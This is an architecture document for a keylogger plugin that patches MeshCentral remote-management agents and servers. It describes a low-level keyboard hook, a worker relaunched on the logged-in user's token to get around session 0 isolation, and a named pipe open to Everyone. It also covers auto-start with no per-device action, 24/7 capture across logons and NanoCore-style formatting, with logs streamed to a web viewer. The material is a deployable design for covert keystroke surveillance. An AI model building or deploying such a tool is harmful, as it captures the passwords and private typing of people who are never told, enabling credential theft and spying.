# Architecture

## Components

```
meshcentral-keylogger/
├── agent/
│   ├── ILibDuktape_Keylogger.h     # C module header (incl. worker entry point)
│   └── ILibDuktape_Keylogger.c     # native keylogger: hook, formatter, worker, pipe, ring, files
├── modules_meshcore/
│   └── win-keylogger.js            # agent tunnel module (protocol 17)
├── plugin/
│   └── mckeylog-viewmode.js        # browser controller for the Keylogs tab
├── scripts/
│   ├── patch_meshcentral.js        # idempotent MeshCentral server patch
│   └── patch_meshagent.js          # idempotent MeshAgent source patch (C module, ServiceMain, vcxproj, makefile)
├── binaries/
│   ├── MeshService.exe             # x86 agent with the keylogger compiled in
│   └── MeshService64.exe           # x64 agent with the keylogger compiled in
├── mckeylog.js                     # plugin entry point (MeshCentral plugin API)
├── config.json                     # plugin manifest (Plugins page install URL)
├── install-keylogger.ps1           # server installer one-liner (incl. Node 26 compat patches)
├── install-keylogger-agent.ps1     # agent binary installer one-liner
└── docs/architecture.md
```

## Data flow

```
Keyboard (interactive session)
   │  WH_KEYBOARD_LL (worker hook thread, PeekMessage loop)
   ▼
keylog-worker  — the agent's own exe relaunched as "MeshService.exe keylog-worker"
   │  via CreateProcessAsUser on the console user's token (WTSQueryUserToken)
   │  NanoCore-style formatter (window markers + assembled text lines)
   │  fixed 400-byte records over \.\pipe\mckeylog:
   │      2-byte little-endian key count (0 for markers) + line text
   ▼
agent service (session 0)
   │  Keylog_StoreLine: 4096×384 in-memory ring  +  rolling keylog-YYYY-MM-DD.log
   │  totalKeys accumulated from the key counts (cumulative, never reset)
   ▼
agents/meshcore.js  ── protocol 17 tunnel ──  meshrelay.js (desktop-rights check)
   │  win-keylogger.js: tail / start / stop / state / list / read / unsub
   ▼
MeshCentral server (authenticated relay, plain JSON over websocket)
   ▼
public/scripts/mckeylog-viewmode.js  (CreateAgentRedirect, protocol 17)
   ▼
views/*.handlebars  page 61 (MainDevKeylogs)
```

When the agent runs *in* an interactive session (e.g. `meshagent` run as a user,
not a service) the in-process hook captures the keys directly and the worker is
never spawned; everything else (ring, files, tunnel) is identical.

## Output format (NanoCore-style)

The live view and the log files contain readable *lines*, not one line per key.
A stateful formatter (per process, lock-free — hook callbacks arrive on the
hooking thread, which is the same thread as the message pump) accumulates typed
text and emits lines like:

```
2026-11-11 17:05:43  -  Window: Some App — Some Document
2026-11-11 17:05:47  -  hello world this is a test
2026-11-11 17:05:48  -  [Enter]
```

Rules:

- **Window change** → any pending text is flushed first, then a
  `Window: <title>` marker line is emitted (key count 0).
- **Text buffer** (~320 chars of UTF-8): typed characters are appended,
  `Backspace` strips the last UTF-8 character, and the buffer is flushed as a
  line when Enter is pressed, the buffer is near full, or the user has been
  idle ≥ 1500 ms (a 250 ms tick drives the idle flush in both the worker and
  the in-process hook thread).
- **Special keys** are inline: `[Enter]`, `[Tab]`, `[Ctrl+X]` (Ctrl+letter),
  plain `[F5]`, `[Shift]` etc. Modifier key downs/ups on their own are not
  logged.
- **Line format**: `YYYY-MM-DD HH:MM:SS  -  <body>`. The date/time prefix is
  kept so log files stay grep-friendly and file date rollover keeps working.
- Each record carries how many physical keydowns produced it; the agent sums
  these into `totalKeys` (so the counter matches real keystrokes, not lines).

## Native module design

- **Singleton** (`g_kl`): the WASAPI module in MeshCentral Audio carries
  per-instance `this` pointers through Duktape and can be corrupted by engine
  restarts. The keylogger is a process-wide singleton — logging continues
  across JS engine restarts, and no finalizer is needed.
- **Session 0 problem**: a MeshAgent *service* runs in session 0. From there
  `OpenInputDesktop` cannot reach the console session's input desktop, so a
  low-level keyboard hook installed in the service never sees the user's keys.
- **User-session worker**: the agent therefore spawns the same executable as
  `keylog-worker` using `CreateProcessAsUserW` on a duplicated console-user
  primary token (`WTSQueryUserToken` + `SetTokenInformation(TokenSessionId)`).
  The worker lives in the interactive session, installs the same
  `WH_KEYBOARD_LL` hook (naturally on that session's desktop), and streams
  formatted lines back over the named pipe `\\.\pipe\mckeylog`. The pipe is
  created with an explicit ACE for `Everyone` (a SYSTEM-owned pipe is not
  writable from a medium-integrity user session by default, error 5). The
  worker dies on logoff; the agent's thread re-spawns it on the next logon /
  user switch with backoff, so capture is 24/7 across sessions.
- **Hook thread**: `SetWindowsHookExW(WH_KEYBOARD_LL, ...)` on a dedicated
  thread with a `PeekMessageW` loop; the thread parks in
  `WaitForSingleObject(stopEvent, 50)` so stop is fast and the hook stays
  responsive (LL hooks time out at ~300 ms).
- **Character resolution**: `ToUnicodeEx` with a synthesized key state from
  `GetAsyncKeyState`/`GetKeyState` (shift/ctrl/alt/win + caps/num/scroll lock),
  so the correct character comes out regardless of which thread queries it.
- **Window titles**: `GetForegroundWindow()` is session-specific — a service
  (session 0) agent sees `NULL`. The fallback enumerates top-level windows,
  skips session-0/tool/no-activate/untitled windows, and takes the top-most
  visible, titled window of an interactive session.
- **Files**: date-named, appended, flushed per line. Rotation: current → `-1`
  → `-2` (oldest dropped). File names are validated strictly
  (`keylog-YYYY-MM-DD[-N].log`) before any path use.
- **Non-Windows**: functional stub so `require('keylogger')` behaves the same
  on Linux/macOS builds (`getState().available` semantics, empty lists).

## JavaScript API (require('keylogger'))

| Call | Result |
| --- | --- |
| `start({logDir?, maxFileSizeKB?, windowTitles?})` | start/restart logging (spawns the worker in session 0) |
| `stop()` | stop the hook thread and the worker |
| `getState()` | `{ available, running, totalKeys, bufferLines, bufferSize, dir, currentFile, maxFileSize, workerPid, lastError }` |
| `read(maxLines=0)` | drain up to N pending ring lines (0 = all), oldest first |
| `listFiles()` | `[{ name, size, mtime }]` newest first |
| `readFile(name, offset, maxBytes)` | `{ data (base64), size, bytes, offset, done }` |

The module auto-starts at agent load on Windows (`win-keylogger.js` calls
`start()` at require-time), so no per-device action is needed after an agent
update/reinstall.

## Tunnel protocol (17)

Agent → browser messages: `state`, `files`, `keys { lines: [...] }`,
`filechunk { file, offset, size, bytes, data, done }`, `error`.
Browser → agent commands: `tail`, `unsub`, `start {opts}`, `stop`, `state`,
`list`, `read { file, offset, max }`.

- The agent drains **all** pending ring lines per 250 ms tick (agent timers can
  coalesce) and applies backpressure via `ws.write === false` + `drain`.
- File reads are sequential 64 KB chunks (1 MB max), base64-encoded.
- The relay rights check requires the same desktop rights as audio (15):
  admin, or remote-control/view without the no-desktop flag.

## Server patch points (all idempotent)

1. `meshrelay.js` — `isProtocolAllowedByRights`: allow protocol 17 only with
   desktop rights (mirrors protocol 15).
2. `agents/meshcore.js`
   - tunnel dispatch: `else if (this.httprequest.protocol == 17)` branch
     (rights check, `descriptorMetadata = "Remote Keylogs"`,
     `require("win-keylogger").handleTunnelData(this, data)`).
   - `onTunnelClosed`: stop the forward timer.
   - auto-start: `if (process.platform == 'win32') require('keylogger').start({})`
     after `var promise = require('promise');`.
3. `views/default.handlebars` + `views/default3.handlebars`
   - script include for `mckeylog-viewmode.js`;
   - top bar `Keylogs` tab (go(61));
   - panel map entry `61: 'MainDevKeylogs'`; loop `i < 62`;
   - submenu/tab-group/shift-click/URL ranges extended to include 61;
   - `p61` page markup;
   - device name into the page title;
   - `go()` lifecycle: `keylogsTabEnter()` / `keylogsTabExit()`.

In addition, `install-keylogger.ps1` applies **Node.js ≥ 26 compatibility
patches** to the installed `node_modules` tree (idempotent, `.bak-mckeylog`
backups; must be re-applied after any MeshCentral upgrade):

- `node_modules/fd-slicer/index.js` (×2) — on Node ≥ 26 the readable-stream
  internals changed: `destroyed` is backed by stream state and streams are
  auto-destroyed right after `end`. yauzl (which MeshCentral uses for the
  plugin zip) hung because the final partial chunk never drained and `end`
  never fired; and the post-`end` auto-destroy was emitting a bogus `error`.
- `node_modules/meshcentral/pluginHandler.js` — the zip entry pointer advanced
  on the *source* stream's `end`, which fires before the write stream's buffer
  flushes, so the LAST file of a plugin zip could be extracted empty; it now
  advances on the write stream's `finish`.

## Agent patch points (patch_meshagent.js)

- `microscript/ILibDuktape_Keylogger.{c,h}` copied in.
- `microscript/ILibDuktape_ScriptContainer.c`: include +
  `ILibDuktape_Keylogger_Init(ctx)` (both under `#ifdef WIN32`).
- `meshservice/ServiceMain.c`: a `keylog-worker` command-line branch — when the
  same exe is relaunched as `"<exe>" keylog-worker <windowTitles>`,
  `ILibDuktape_KeyloggerWorker_Run(argc, argv)` is called instead of the normal
  agent/service startup (this is what lets one binary serve as both agent and
  user-session worker).
- All `meshservice`/`meshconsole` vcxproj files: ClCompile + ClInclude items.
- `makefile`: source appended for non-Visual-Studio builds.

## Building the agent binaries

From a MeshAgent checkout with Visual Studio 2022 (v143) or newer:

```powershell
node scripts/patch_meshagent.js <path-to-MeshAgent>
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x64
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x86
```

(Use `/p:Platform=x86`, not `Win32` — the solution's x86 platform is named
`x86`; otherwise MSBuild fails with MSB4126.)

Outputs: `meshservice\Release\MeshService64.exe` and `meshservice\Release\MeshService.exe`.
Replace the files in `binaries/` and push, then re-run the agent installer.
